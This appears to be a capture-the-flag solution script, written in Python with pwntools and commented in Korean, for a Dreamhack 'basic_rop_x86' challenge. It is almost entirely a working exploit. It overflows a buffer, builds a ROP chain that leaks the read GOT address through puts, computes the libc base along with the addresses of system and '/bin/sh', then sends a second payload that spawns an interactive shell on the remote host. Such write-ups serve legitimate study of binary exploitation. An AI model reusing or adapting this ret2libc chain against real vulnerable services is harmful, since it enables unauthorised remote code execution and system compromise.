from pwn import *		
context.arch='i386'
context.log_level='debug'

p=remote('host3.dreamhack.games',13693)
#p = process('./basic_rop_x86')
e = ELF('./basic_rop_x86')	
libc = ELF('./libc.so.6')

def slog (name, addr):
    return success(": ".join ([name, hex(addr)]))
# prequisite
# x86은 calling convention이 x64와 다름
# 먼저 plt 부른 후 스택에 있는 매개변수 전달(정리)

# what we need? & how to
# system 함수의 주소와 /bin/sh 문자열이 필요함
# system 함수 주소는 다른 함수의 got주소와 offset으로 찾을 수 있음
# 문제는 /bin/sh 문자열을 어떻게 얻을 것인가?
# 1. libc.so.6에 있는 것을 참조한다.   
# 2. 메모리에서 쓰기 가능한 영역을 찾아 거기에 저장한 후 돌아온다.
# 두가지 방법 존재

# [exploit plan]
# 보호기법은 partial RELRO, NX enabled 
# ROP를 이용하여 payload를 짜기
# 1. 맨 처음에는 write 함수를 이용한 read함수 주소 출력
# 2. write함수를 통한 system 주소 계산 및 read함수 got overwrite
# 3. write 함수를 통한 /bin/sh 저장
# 4. system('/bin/sh')

read_plt = e.plt['read'] # read함수 plt
read_got = e.got['read'] # read함수 got
write_plt=e.plt['write'] # write함수 plt
puts_plt = e.plt['puts']# puts함수 plt
main= e.symbols['main']  # main함수 심볼

#rop gadget => ROPgadget --binary ./basic_rop_x86 --re 명령어 로 찾음
pop_ebp = 0x0804868b #pop ebp; ret 가젯
pop_ebx = 0x080483d9 #pop ebx; ret gadget
pop_edi_ebp = 0x0804868a # pop edi; pop ebp; ret
pop_esi_edi_ebp = 0x08048689 #pop esi; pop edi; pop ebp; ret
ret=0x080483c2 # ret gadget
binsh=0x15902b

# payload
payload=b'a'*0x48 #padding buf to ebp
payload+=p32(puts_plt) #puts 함수는 매개변수가 하나 밖에 없어 젤 단순하기 때문에 걍 write 대신 씀
payload+=p32(pop_ebx) 
payload+=p32(read_got) 
payload+=p32(main) # ret to main
p.send(payload)

p.recvuntil(b'a'*0x40)
read = u32(p.recvn(4))
libc_base = read - libc.symbols['read']
system = libc_base + libc.symbols['system']
binsh += libc_base 

slog("read",read)
slog("libc_base",libc_base)
slog("system",system)
slog("binsh",binsh)

payload2=b'a'*0x48
payload2+=p32(system)
#payload2+=p32(pop_ebp)
payload2+=b'a'*4
payload2+=p32(binsh)

p.send(payload2)

p.interactive()

